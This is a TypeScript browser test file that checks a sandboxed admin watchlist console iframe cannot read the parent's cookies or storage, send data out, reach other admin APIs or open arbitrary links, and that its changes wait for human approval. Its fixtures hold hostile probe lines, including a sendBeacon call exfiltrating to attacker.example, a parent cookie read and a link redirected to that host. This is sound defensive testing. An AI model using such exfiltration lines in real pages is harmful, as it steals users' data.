// @vitest-environment node
import { describe, expect, it } from "vitest";
import { chromium } from "@playwright/test";
import { readFileSync } from "node:fs";
import { WATCHLIST_CONSOLE_BOOTSTRAP, WATCHLIST_CONSOLE_CSP } from "@/src/modules/watchlist/server/runtime/watchlist-console-sandbox";
import { rewriteWatchlistRuntimeDocument } from "@/src/modules/watchlist/server/runtime/watchlist-runtime-admin-document";
import { readWatchlistConsoleRequest } from "./watchlist-console-bridge";

describe("real browser opaque console boundary with synthetic routes", () => {
  it.each([false, true])("submits Add ticker and opens only the fixed Watchlist link, mobile=%s", async mobile => {
    const client = readFileSync("app/(dashboard)/admin/watchlist/watchlist-runtime-admin-client.tsx", "utf8");
    const sandbox = client.match(/sandbox="([^"]+)"/)?.[1];
    const navigation = client.split("\n").find(line => line.includes('message.type === "open-live-watchlist"'));
    expect(sandbox).toBe("allow-scripts allow-forms");
    expect(navigation).toContain('window.open("https://traderslink.pro/watchlist", "_blank", "noopener,noreferrer")');
    const browser = await chromium.launch({ headless: true });
    try {
      const context = await browser.newContext({ viewport: mobile ? { width: 390, height: 844 } : { width: 1280, height: 900 }, isMobile: mobile });
      const page = await context.newPage();
      const unexpected: string[] = [];
      await page.exposeFunction("validateRelay", (value: unknown) => readWatchlistConsoleRequest(value, "https://console.example.test"));
      const parent = `<!doctype html><button id="approve">Confirm change</button><button id="cancel">Cancel</button><iframe sandbox="${sandbox}" src="/console"></iframe><script>
      window.results=[];window.sent=[];window.pending=null;let generation=null;
      const frame=document.querySelector('iframe');
      addEventListener('message',async e=>{
        if(e.source!==frame.contentWindow||e.origin!=='null')return;
        const message=e.data;
        if(message?.source==='probe'){results.push(message);return;}
        if(message?.source==='traderslink-watchlist-admin'){${navigation}return;}
        if(message?.source!=='traderslink-watchlist-relay')return;
        if(message.type==='initialize'){generation=message.generation;return;}
        if(message.type!=='request'||!generation||!message.id.startsWith(generation+'-'))return;
        const input=await window.validateRelay(message);
        const reply=value=>frame.contentWindow.postMessage({source:'traderslink-watchlist-relay-response',id:message.id,...value},'*');
        if(!input){reply({error:'blocked'});return;}
        if(input.method==='POST'){window.pending={input,reply};return;}
        reply({status:200,contentType:'application/json',body:'{"ok":true}'});
      });
      document.querySelector('#approve').onclick=()=>{const p=window.pending;if(p){sent.push(p.input);p.reply({status:200,contentType:'application/json',body:'{}'});window.pending=null;}};
      document.querySelector('#cancel').onclick=()=>{const p=window.pending;if(p){p.reply({error:'Change cancelled.'});window.pending=null;}};
      </script>`;
      const child = `<!doctype html>${WATCHLIST_CONSOLE_BOOTSTRAP}<form id="add"><input required value="ABCD"><button>Add ticker</button></form>
      <a id="open-live-watchlist-link" href="https://traderslink.pro/watchlist" target="_blank">Open Live Watchlist</a>
      <a id="other-link" href="https://attacker.example/" target="_blank">Other link</a>
      <form id="native" action="/must-not-submit" method="post"><button>Native submit</button></form><script>
      const probe=detail=>parent.postMessage({source:'probe',...detail},window.location.origin);
      try{parent.document.cookie;probe({parentReadable:true});}catch{probe({parentReadable:false});}
      try{localStorage.getItem('private');probe({storageReadable:true});}catch{probe({storageReadable:false});}
      try{navigator.sendBeacon('https://attacker.example/collect','private');}catch{}
      fetch('/api/admin/journal/users').then(()=>probe({journalBlocked:false})).catch(()=>probe({journalBlocked:true}));
      fetch('/api/admin/watchlist/runtime/watchlist').then(r=>r.json()).then(v=>probe({read:v.ok}));
      document.querySelector('#add').addEventListener('submit',e=>{e.preventDefault();fetch('/api/admin/watchlist/runtime/watchlist/activate',{method:'POST',body:'{"symbol":"ABCD"}'}).then(()=>probe({added:true})).catch(e=>probe({error:e.message}));});
      </script>`;
      await context.route("**/*", async route => {
        const url = new URL(route.request().url());
        if (url.href === "https://traderslink.pro/watchlist") return route.fulfill({ contentType: "text/html", body: "<!doctype html><p>Local Watchlist destination fixture</p>" });
        if (url.origin !== "https://console.example.test") { unexpected.push(url.href); return route.abort(); }
        if (url.pathname === "/") return route.fulfill({ contentType: "text/html", body: parent });
        if (url.pathname === "/console") return route.fulfill({ headers: { "content-type": "text/html", "content-security-policy": WATCHLIST_CONSOLE_CSP }, body: child });
        unexpected.push(url.href); return route.abort();
      });
      await page.goto("https://console.example.test/");
      await page.waitForFunction(() => (window as unknown as { results: object[] }).results.length >= 4);
      const frame = page.frameLocator("iframe");
      await frame.locator("#add button").click();
      await page.waitForFunction(() => Boolean((window as unknown as { pending: unknown }).pending));
      expect(await page.evaluate(() => (window as unknown as { sent: unknown[] }).sent)).toEqual([]);
      await page.click("#approve");
      await page.waitForFunction(() => (window as unknown as { results: { added?: boolean }[] }).results.some(r => r.added));
      expect(await page.evaluate(() => (window as unknown as { sent: { body: string }[] }).sent.map(r => r.body))).toEqual(['{"symbol":"ABCD"}']);
      await frame.locator("#add button").click();
      await page.waitForFunction(() => Boolean((window as unknown as { pending: unknown }).pending));
      await page.click("#cancel");
      await page.waitForFunction(() => (window as unknown as { results: { error?: string }[] }).results.some(r => r.error === "Change cancelled."));
      expect(await page.evaluate(() => (window as unknown as { sent: unknown[] }).sent.length)).toBe(1);
      const popupPromise = context.waitForEvent("page");
      await frame.locator("#open-live-watchlist-link").click();
      const popup = await popupPromise;
      await popup.waitForLoadState("domcontentloaded");
      expect(popup.url()).toBe("https://traderslink.pro/watchlist");
      expect(await popup.evaluate(() => window.opener === null)).toBe(true);
      await popup.close();
      await frame.locator("#other-link").click();
      await frame.locator("#open-live-watchlist-link").evaluate(link => link.setAttribute("href", "https://attacker.example/"));
      await frame.locator("#open-live-watchlist-link").click();
      await frame.locator("#native button").click();
      expect(context.pages()).toHaveLength(1);
      expect(await page.evaluate(() => (window as unknown as { results: object[] }).results)).toEqual(expect.arrayContaining([
        { source: "probe", parentReadable: false }, { source: "probe", storageReadable: false }, { source: "probe", journalBlocked: true }, { source: "probe", read: true },
      ]));
      expect(unexpected).toEqual([]);
      await context.close();
    } finally { await browser.close(); }
  }, 30_000);

  it("blocks parent DOM/credential access and direct network; relays reads and waits for mutation approval", async () => {
    const browser = await chromium.launch({ headless: true });
    try {
      const page = await browser.newPage();
      const unexpected: string[] = [];
      await page.exposeFunction("validateRelay", (value: unknown) => readWatchlistConsoleRequest(value, "https://console.example.test"));
      const parent = `<!doctype html><button id="approve">Confirm change</button><iframe sandbox="allow-scripts" src="/console"></iframe><script>
      window.results=[];window.sent=[];window.pending=null;
      const frame=document.querySelector('iframe');
      window.addEventListener('message',async e=>{
       if(e.source!==frame.contentWindow||e.origin!=='null')return;
       if(e.data?.source==='probe'){window.results.push(e.data);return;}
       if(e.data?.source!=='traderslink-watchlist-relay'||e.data.type!=='request')return;
       const input=await window.validateRelay(e.data);
       const reply=result=>frame.contentWindow.postMessage({source:'traderslink-watchlist-relay-response',id:e.data.id,...result},'*');
       if(!input){reply({error:'blocked'});return;}
       if(input.method==='POST'){window.pending={input,reply};return;}
       reply({status:200,contentType:'application/json',body:'{"ok":true}'});
      });
      document.querySelector('#approve').onclick=()=>{const pending=window.pending;if(pending){window.sent.push(pending.input);pending.reply({status:200,contentType:'application/json',body:'{}'});window.pending=null;}};
      </script>`;
      const child = rewriteWatchlistRuntimeDocument(`<!doctype html><html><head></head><body><script>
       const probe=detail=>parent.postMessage({source:'probe',...detail},window.location.origin);
       try{parent.document.cookie;probe({parentReadable:true});}catch{probe({parentReadable:false});}
       try{localStorage.getItem('private');probe({storageReadable:true});}catch{probe({storageReadable:false});}
       try{navigator.sendBeacon('https://attacker.example/collect','private');}catch{}
       fetch('/api/admin/journal/users').then(()=>probe({journalBlocked:false})).catch(()=>probe({journalBlocked:true}));
       fetch('/api/admin/watchlist/runtime/watchlist').then(r=>r.json()).then(value=>probe({read:value.ok}));
       fetch('/api/admin/watchlist/runtime/watchlist/activate',{method:'POST',body:'{"symbol":"ABCD"}'}).then(()=>probe({mutationCompleted:true}));
      </script></body></html>`);
      await page.route("**/*", async route => {
        const url = new URL(route.request().url());
        if (url.origin !== "https://console.example.test") { unexpected.push(url.href); return route.abort(); }
        if (url.pathname === "/") return route.fulfill({ contentType: "text/html", body: parent });
        if (url.pathname === "/console") return route.fulfill({ headers: { "content-type": "text/html", "content-security-policy": WATCHLIST_CONSOLE_CSP }, body: child });
        unexpected.push(url.href); return route.abort();
      });
      await page.goto("https://console.example.test/");
      await page.waitForFunction(() => (window as unknown as { results: object[]; pending: unknown }).results.length >= 4 && Boolean((window as unknown as { pending: unknown }).pending));
      const before = await page.evaluate(() => ({ results: (window as unknown as { results: object[] }).results, sent: (window as unknown as { sent: object[] }).sent }));
      expect(before.results).toEqual(expect.arrayContaining([{ source: "probe", parentReadable: false }, { source: "probe", storageReadable: false }, { source: "probe", journalBlocked: true }, { source: "probe", read: true }]));
      expect(before.sent).toEqual([]);
      await page.click("#approve");
      await page.waitForFunction(() => (window as unknown as { results: { mutationCompleted?: boolean }[] }).results.some(item => item.mutationCompleted));
      expect(await page.evaluate(() => (window as unknown as { sent: { body: string }[] }).sent[0].body)).toBe('{"symbol":"ABCD"}');
      expect(unexpected).toEqual([]);
    } finally { await browser.close(); }
  }, 30_000);
});
